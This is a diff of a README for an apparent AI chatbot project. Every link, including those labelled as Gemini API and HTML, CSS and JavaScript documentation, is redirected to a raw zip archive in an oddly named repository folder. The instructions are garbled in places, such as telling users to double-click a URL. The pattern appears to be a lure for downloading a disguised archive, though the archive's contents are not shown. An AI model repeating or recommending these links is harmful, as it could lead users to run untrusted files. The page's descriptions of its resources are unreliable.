@@ -1,6 +1,6 @@
 # 🤖 Personal-AI-Chatbot - Your Friendly AI Assistant Awaits
 
-[![Download Now](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip%20Now-Click%https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip)](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip)
+[![Download Now](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip%20Now-Click%https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip)](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Welcome to **Personal-AI-Chatbot**! This is a fully interactive AI-powered chatb
 Follow these simple steps to set up your Personal-AI-Chatbot:
 
 1. **Download the Software**
-   - Visit the [Releases Page](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip) to get the latest version of the chatbot.
+   - Visit the [Releases Page](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip) to get the latest version of the chatbot.
 
 2. **Install Required Software**
    - Ensure you have a web browser installed (Chrome, Firefox, or Safari work best).
@@ -23,7 +23,7 @@ Follow these simple steps to set up your Personal-AI-Chatbot:
 
 4. **Open the Application**
    - Open the folder containing the extracted files.
-   - Double-click on `https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip` to launch the chatbot in your web browser.
+   - Double-click on `https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip` to launch the chatbot in your web browser.
 
 ## 🌟 Features
 
@@ -43,11 +43,11 @@ To run Personal-AI-Chatbot effectively, ensure your system meets the following r
 
 ## 📥 Download & Install
 
-To get started, simply visit the [Releases Page](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip). From there, download the latest version.
+To get started, simply visit the [Releases Page](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip). From there, download the latest version.
 
 1. Click on the desired version and proceed to download.
 2. Once the file is downloaded, extract it as described above.
-3. Open `https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip` and start chatting!
+3. Open `https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip` and start chatting!
 
 ## 🛠️ Troubleshooting
 
@@ -72,9 +72,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Resources
 
-- [Google Gemini API](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip)
-- [HTML Documentation](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip)
-- [CSS Documentation](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip)
-- [JavaScript Documentation](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip)
+- [Google Gemini API](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip)
+- [HTML Documentation](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip)
+- [CSS Documentation](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip)
+- [JavaScript Documentation](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip)
 
-Visit the [Releases Page](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/Personal-AI-Chatbot.zip) again for the latest updates and versions. Enjoy using your Personal-AI-Chatbot!
+Visit the [Releases Page](https://raw.githubusercontent.com/jorgersco/Personal-AI-Chatbot/main/rilly/A_Personal_Chatbot_v1.4.zip) again for the latest updates and versions. Enjoy using your Personal-AI-Chatbot!
